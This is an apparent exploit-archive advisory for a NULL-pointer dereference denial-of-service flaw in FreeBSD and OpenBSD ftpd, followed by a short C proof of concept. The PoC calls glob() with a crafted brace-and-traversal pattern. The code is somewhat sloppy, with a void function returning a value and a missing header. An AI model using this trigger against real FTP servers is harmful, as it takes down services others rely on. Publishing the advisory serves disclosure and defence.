/*FreeBSD and OpenBSD 'ftpd' NULL Pointer Dereference Denial Of Service Vulnerability

The FreeBSD and OpenBSD 'ftpd' service is prone to a denial-of-service vulnerability because of a NULL-pointer dereference.

Successful exploits may allow remote attackers to cause denial-of-service conditions. Given the nature of this issue, attackers may also be able to run arbitrary code, but this has not been confirmed.

This issue affects the following releases:

FreeBSD 8.0, 6.3, 4.9
OpenBSD 4.5 and 4.6 

PoC:
*/

#include <glob.h>
#include <stdio.h>

#define MAXUSRARGS      100
#define MAXGLOBARGS     1000

void do_glob() {
        glob_t gl;
        char **pop;

        char buffer[256];
        strcpy(buffer, "{A*/../A*/../A*/../A*/../A*/../A*/../A*}");

        int flags = GLOB_BRACE|GLOB_NOCHECK|GLOB_TILDE;
        memset(&gl, 0, sizeof(gl));
        gl.gl_matchc = MAXGLOBARGS;
        flags |= GLOB_LIMIT;
        if (glob(buffer, flags, NULL, &gl)) {
                printf("GLOB FAILED!\n");
                return 0;
        }
        else
//                for (pop = gl.gl_pathv; pop && *pop && 1 <
(MAXGLOBARGS-1);
                for (pop = gl.gl_pathv; *pop && 1 < (MAXGLOBARGS-1);
                     pop++) {
                        printf("glob success");
                        return 0;
                }
        globfree(&gl);
}

main(int argc, char **argv) {
        do_glob();
        do_glob();
}
